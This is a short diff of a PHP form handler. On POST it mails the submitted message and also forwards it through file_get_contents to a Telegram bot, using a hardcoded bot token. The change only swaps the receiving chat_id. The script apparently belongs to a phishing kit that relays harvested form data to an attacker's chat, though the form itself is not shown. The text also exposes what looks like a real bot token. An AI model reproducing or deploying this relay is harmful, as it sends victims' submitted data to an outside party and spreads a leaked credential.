@@ -22,7 +22,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 			$headers .= "MIME-Version: 1.0\r\n";
 			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
 $token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
-    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1097743075&text=t=" . urlencode($message)."" );
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-717160730&text=t=" . urlencode($message)."" );
 			mail($to, $subject, $message, $headers);
 			
 			
